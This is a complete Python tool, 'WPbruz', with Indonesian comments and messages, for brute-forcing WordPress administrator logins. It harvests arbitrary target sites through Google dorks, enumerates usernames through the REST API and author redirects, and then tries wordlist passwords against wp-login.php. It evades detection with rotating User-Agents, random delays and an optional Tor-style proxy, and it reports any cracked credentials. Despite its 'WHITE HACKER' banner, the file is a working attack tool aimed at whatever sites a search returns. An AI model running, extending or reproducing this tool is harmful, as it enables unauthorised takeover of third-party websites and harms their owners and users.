#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import os
import sys
import argparse
import logging
import random
import time
import platform
import subprocess

from pathlib import Path
from typing import List, Optional, Tuple, Set

# ──────────────────────────────────────────────────────────────────────────────
# OPTIONAL DEPENDENCY: googlesearch
# pip install googlesearch-python
# ──────────────────────────────────────────────────────────────────────────────
try:
    from googlesearch import search
except ImportError:
    search = None

# ──────────────────────────────────────────────────────────────────────────────
# Files for resume/checkpoint and scanned targets
RESUME_FILE = Path(".wpbruz_resume")
SCANNED_FILE = Path(".wpbruz_scanned")

# ──────────────────────────────────────────────────────────────────────────────
#  Terminal Color Codes
# ──────────────────────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
RED    = "\033[91m"
CYAN   = "\033[96m"
RESET  = "\033[0m"

# ──────────────────────────────────────────────────────────────────────────────
#  ASCII Art Header
# ──────────────────────────────────────────────────────────────────────────────
ASCII_ART = f"""
{GREEN}
 █     █░ ██▓███   ▄▄▄▄    ██▀███   █    ██ ▒███████▒
▓█░ █ ░█░▓██░  ██▒▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▒ ▒ ▒ ▄▀░
▒█░ █ ░█ ▓██░ ██▓▒▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░░ ▒ ▄▀▒░ 
░█░ █ ░█ ▒██▄█▓▒ ▒▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░  ▄▀▒   ░
░░██▒██▓ ▒██▒ ░  ░░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓ ▒███████▒
░ ▓░▒ ▒  ▒▓▒░ ░  ░░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ░▒▒ ▓░▒░▒
  ▒ ░ ░  ░▒ ░     ▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░ ░░▒ ▒ ░ ▒
  ░   ░  ░░        ░    ░   ░░   ░  ░░░ ░ ░ ░ ░ ░ ░ ░
    ░              ░         ░        ░       ░ ░    
                        ░                   ░        
{RESET}

{CYAN}WHITE HACKER{RESET}
"""

# ──────────────────────────────────────────────────────────────────────────────
#  Some common User-Agent strings to rotate
# ──────────────────────────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
    " Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko)"
    " Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"
    " Chrome/115.0.0.0 Safari/537.36",
]

def clear_screen():
    cmd = "cls" if platform.system() == "Windows" else "clear"
    subprocess.call(cmd, shell=True)

def setup_logging(log_file: Optional[Path] = None, debug: bool = False):
    level = logging.DEBUG if debug else logging.INFO
    handlers = [logging.StreamHandler(sys.stdout)]
    if log_file:
        handlers.append(logging.FileHandler(log_file, encoding="utf-8"))
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(message)s",
        handlers=handlers,
    )

def read_scanned() -> Set[str]:
    if SCANNED_FILE.exists():
        return {line.strip() for line in SCANNED_FILE.read_text().splitlines() if line.strip()}
    return set()

def append_scanned(target: str):
    with SCANNED_FILE.open("a", encoding="utf-8") as f:
        f.write(target + "\n")

def find_targets_from_dork(dork: str, limit: int) -> List[str]:
    if search is None:
        logging.error("Module googlesearch belum terinstall. pip install googlesearch-python")
        sys.exit(1)
    scanned = read_scanned()
    fetch_count = limit + len(scanned)
    logging.info("Mencari target via Google dork '%s' (skip %d yg sudah diproses)", dork, len(scanned))
    raw: List[str] = []
    for url in search(dork, fetch_count):
        time.sleep(1)
        m = re.match(r"https?://[^/]+", url)
        if m:
            root = m.group(0)
            if root not in raw:
                raw.append(root)
    new_targets = [t for t in raw if t not in scanned][:limit]
    logging.info("Ditemukan %d target baru", len(new_targets))
    return new_targets

def get_usernames(target_url: str, timeout: float) -> List[str]:
    users: List[str] = []
    api = f"{target_url.rstrip('/')}/wp-json/wp/v2/users"
    logging.info("[%s] Mencoba REST API", target_url)
    try:
        r = requests.get(api, timeout=timeout, headers={"User-Agent": random.choice(USER_AGENTS)})
        if r.status_code == 200:
            for u in r.json():
                slug = u.get("slug")
                if slug: users.append(slug)
            logging.info("Ditemukan %d user via REST API", len(users))
            return users
    except Exception:
        pass
    logging.info("Fallback author enumeration...")
    for i in range(1, 11):
        try:
            r = requests.get(f"{target_url.rstrip('/')}/?author={i}",
                             timeout=timeout, allow_redirects=True,
                             headers={"User-Agent": random.choice(USER_AGENTS)})
            if r.status_code == 200:
                m = re.search(r"/author/([^/]+)/?", r.url)
                if m:
                    s = m.group(1)
                    if s not in users: users.append(s)
        except Exception:
            continue
    logging.info("Ditemukan %d user via enumeration", len(users))
    return users

def pilih_username(usernames: List[str]) -> Optional[str]:
    if not usernames:
        logging.error("Tidak ada username ditemukan.")
        return None
    print(); logging.info("Username yang ditemukan:")
    for i, u in enumerate(usernames, 1):
        print(f"  [{i}] {u}")
    while True:
        try:
            c = int(input(f"{YELLOW}[?] Pilih nomor username: {RESET}"))
            if 1 <= c <= len(usernames):
                return usernames[c-1]
        except ValueError:
            pass
        logging.warning("Pilihan tidak valid, coba lagi.")

def bruteforce_wp(
    target_url: str,
    username: str,
    passwords: List[str],
    timeout: float,
    delay_range: Tuple[float, float],
    resume_file: Path,
    proxy: Optional[str]
) -> Optional[str]:
    login_url = f"{target_url.rstrip('/')}/wp-login.php"
    session = requests.Session()
    proxies = {"http": proxy, "https": proxy} if proxy else None
    total = len(passwords)
    start = 0
    if resume_file.exists():
        val = int(resume_file.read_text().strip() or "0")
        if val < total:
            start = val
            logging.info("Resume dari password ke-%d", start)
        else:
            resume_file.unlink()
    error_count = 0
    try:
        for idx in range(start, total):
            pwd = passwords[idx]
            print(f"\r{YELLOW}[{idx+1}/{total}]{RESET} {target_url} ▶ {username}:{pwd}", end="", flush=True)
            time.sleep(random.uniform(*delay_range))
            try:
                r = session.post(
                    login_url,
                    data={
                        "log": username, "pwd": pwd,
                        "wp-submit": "Log In",
                        "redirect_to": f"{target_url.rstrip('/')}/wp-admin/",
                        "testcookie": "1"
                    },
                    timeout=timeout,
                    allow_redirects=True,
                    headers={"User-Agent": random.choice(USER_AGENTS)},
                    proxies=proxies
                )
            except requests.RequestException as e:
                error_count += 1
                logging.warning("Request gagal (%d/15): %s", error_count, e)
                if error_count >= 15:
                    print()
                    logging.error("Terlalu banyak error, skip target %s", target_url)
                    resume_file.unlink(missing_ok=True)
                    return None
                continue
            if "wordpress_logged_in" in session.cookies.get_dict() or "/wp-admin/" in r.url:
                print()
                logging.info(f"{GREEN}🎉 Password ditemukan: {username} / {pwd}{RESET}")
                resume_file.unlink(missing_ok=True)
                return pwd
            resume_file.write_text(str(idx+1))
    except KeyboardInterrupt:
        print()
        resume_file.unlink(missing_ok=True)
        logging.warning("Dihentikan user, resume file dihapus.")
        sys.exit(1)
    print()
    resume_file.unlink(missing_ok=True)
    logging.error("Tidak ada password cocok untuk %s di %s", username, target_url)
    return None

def main():
    clear_screen()
    print(ASCII_ART)

    p = argparse.ArgumentParser(description="WPbruz — Brute-force WordPress")
    p.add_argument("target", help="URL target (ignored if --dork used)")
    p.add_argument("wordlist", help="Path ke file password list")
    p.add_argument("--username", help="Username (lewati enumeration)")
    p.add_argument("--timeout",  type=float, default=10.0, help="Timeout per request")
    p.add_argument("--delay",    type=float, nargs=2, default=(1.0,3.0),
                   metavar=("MIN","MAX"), help="Jeda acak antar request")
    p.add_argument("--proxy",    help="Proxy (e.g. socks5://127.0.0.1:9050)")
    p.add_argument("--log-file", help="Simpan log ke file")
    p.add_argument("--debug",    action="store_true", help="Debug output")
    p.add_argument("--dork",     help="Google dork (inurl:wp-login.php site:...)")
    p.add_argument("--limit",    type=int, default=15, help="Maks hasil Google dork")
    args = p.parse_args()

    setup_logging(Path(args.log_file) if args.log_file else None, args.debug)

    # build targets list
    if args.dork:
        targets = find_targets_from_dork(args.dork, args.limit)
    else:
        targets = [args.target.rstrip('/')]

    # load wordlist
    try:
        pwds = [l.strip() for l in open(args.wordlist, "r", encoding="utf-8", errors="ignore") if l.strip()]
    except FileNotFoundError:
        logging.error("Wordlist tidak ditemukan: %s", args.wordlist)
        sys.exit(1)

    # ────────── perbaikan di loop utama ──────────
    for tgt in targets:
        logging.info("=== Memproses target: %s ===", tgt)

        # 1) Enum username dulu
        if args.username:
            user = args.username
        else:
            users = get_usernames(tgt, args.timeout)
            if not users:
                logging.warning("Skip %s: tidak ada user ditemukan via REST/API.", tgt)
                append_scanned(tgt)
                continue
            user = pilih_username(users)
            if not user:
                logging.warning("Skip %s: user tidak dipilih.", tgt)
                append_scanned(tgt)
                continue

        # 2) Baru cek wp-login.php
        login_url = f"{tgt.rstrip('/')}/wp-login.php"
        try:
            h = requests.head(login_url, timeout=5,
                             headers={"User-Agent": random.choice(USER_AGENTS)})
            if h.status_code != 200:
                logging.warning("Skip %s: wp-login.php tidak ada (status %d)", tgt, h.status_code)
                append_scanned(tgt)
                continue
        except Exception:
            logging.warning("Skip %s: tidak bisa konek wp-login.php", tgt)
            append_scanned(tgt)
            continue

        # 3) Lanjut brute-force
        logging.info("Brute-force %s di %s (%d pwd)", user, tgt, len(pwds))
        found = bruteforce_wp(
            target_url  = tgt,
            username    = user,
            passwords   = pwds,
            timeout     = args.timeout,
            delay_range = (args.delay[0], args.delay[1]),
            resume_file = RESUME_FILE,
            proxy       = args.proxy,
        )
        append_scanned(tgt)

        if found:
            logging.info("=> Sukses di %s: %s / %s", tgt, user, found)
        else:
            logging.warning("=> Gagal di %s", tgt)

    logging.info("=== Semua target selesai ===")

if __name__ == "__main__":
    main()
